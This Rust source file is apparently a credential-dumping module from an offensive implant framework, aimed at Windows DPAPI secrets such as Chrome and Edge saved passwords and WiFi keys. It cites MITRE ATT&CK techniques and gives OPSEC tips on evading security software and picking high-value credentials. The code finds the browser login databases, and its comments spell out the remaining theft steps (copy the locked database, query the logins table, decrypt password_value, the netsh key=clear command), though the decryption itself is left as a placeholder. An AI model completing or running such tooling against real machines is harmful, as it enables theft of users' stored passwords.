//! DPAPI credential extraction
//!
//! Extracts secrets protected by the Data Protection API including:
//! - Browser saved passwords (Chrome, Edge, Firefox)
//! - WiFi passwords
//! - Application credentials
//!
//! ## MITRE ATT&CK
//! - T1555.003: Credentials from Password Stores: Credentials from Web Browsers
//! - T1555.004: Credentials from Password Stores: Windows Credential Manager
//!
//! ## OPSEC
//! - DPAPI decryption requires user context or master key
//! - Browser credential access may trigger security software
//! - Consider targeting specific high-value credentials

#[allow(unused_imports)]
use common::{CredentialInfo, CredentialOutput, KrakenError};
use protocol::CredDumpDpapi;

/// Dump DPAPI-protected credentials
#[cfg(windows)]
pub fn dump(req: &CredDumpDpapi) -> Result<CredentialOutput, KrakenError> {
    use windows_sys::Win32::Security::Cryptography::{
        CryptUnprotectData, CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN,
    };

    let mut credentials = Vec::new();

    // DPAPI credential extraction targets:
    // 1. Chrome Login Data (SQLite + DPAPI)
    // 2. Edge Login Data
    // 3. Firefox logins.json (different encryption)
    // 4. WiFi profiles (netsh or registry)

    // Chrome credentials path
    let chrome_path = get_chrome_login_path()?;
    if let Ok(chrome_creds) = extract_chrome_credentials(&chrome_path) {
        credentials.extend(chrome_creds);
    }

    // Edge credentials (similar to Chrome)
    let edge_path = get_edge_login_path()?;
    if let Ok(edge_creds) = extract_chrome_credentials(&edge_path) {
        credentials.extend(edge_creds);
    }

    // WiFi passwords
    if let Ok(wifi_creds) = extract_wifi_credentials() {
        credentials.extend(wifi_creds);
    }

    if credentials.is_empty() {
        tracing::info!("No DPAPI credentials found");
    }

    Ok(CredentialOutput { credentials })
}

#[cfg(windows)]
fn get_chrome_login_path() -> Result<String, KrakenError> {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .map_err(|_| KrakenError::Module("LOCALAPPDATA not set".into()))?;
    Ok(format!(
        "{}\\Google\\Chrome\\User Data\\Default\\Login Data",
        local_app_data
    ))
}

#[cfg(windows)]
fn get_edge_login_path() -> Result<String, KrakenError> {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .map_err(|_| KrakenError::Module("LOCALAPPDATA not set".into()))?;
    Ok(format!(
        "{}\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        local_app_data
    ))
}

#[cfg(windows)]
fn extract_chrome_credentials(db_path: &str) -> Result<Vec<CredentialInfo>, KrakenError> {
    // Chrome stores credentials in SQLite database
    // Password field is DPAPI-encrypted (or AES-GCM with master key in newer versions)
    //
    // Steps:
    // 1. Copy database (locked while Chrome running)
    // 2. Query logins table
    // 3. Decrypt password_value using DPAPI or master key

    let mut creds = Vec::new();

    // Framework placeholder - actual implementation would:
    // 1. Open SQLite database
    // 2. SELECT origin_url, username_value, password_value FROM logins
    // 3. Decrypt password_value

    if std::path::Path::new(db_path).exists() {
        creds.push(CredentialInfo {
            credential_type: "browser".to_string(),
            domain: "chrome".to_string(),
            username: "[encrypted]".to_string(),
            data: "[DPAPI decryption required]".to_string(),
            source: db_path.to_string(),
        });
    }

    Ok(creds)
}

#[cfg(windows)]
fn extract_wifi_credentials() -> Result<Vec<CredentialInfo>, KrakenError> {
    // WiFi passwords stored in:
    // - Registry: HKLM\SOFTWARE\Microsoft\Wlansvc\...
    // - Or via netsh wlan show profile key=clear
    //
    // DPAPI protects the key material

    let creds = Vec::new();

    // Framework placeholder - actual implementation would:
    // 1. Enumerate WiFi profiles
    // 2. Extract and decrypt key material

    Ok(creds)
}

#[cfg(not(windows))]
pub fn dump(_req: &CredDumpDpapi) -> Result<CredentialOutput, KrakenError> {
    Err(KrakenError::Module(
        "DPAPI extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_dpapi_unsupported_platform() {
        let req = CredDumpDpapi { target_user: None };
        let result = dump(&req);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
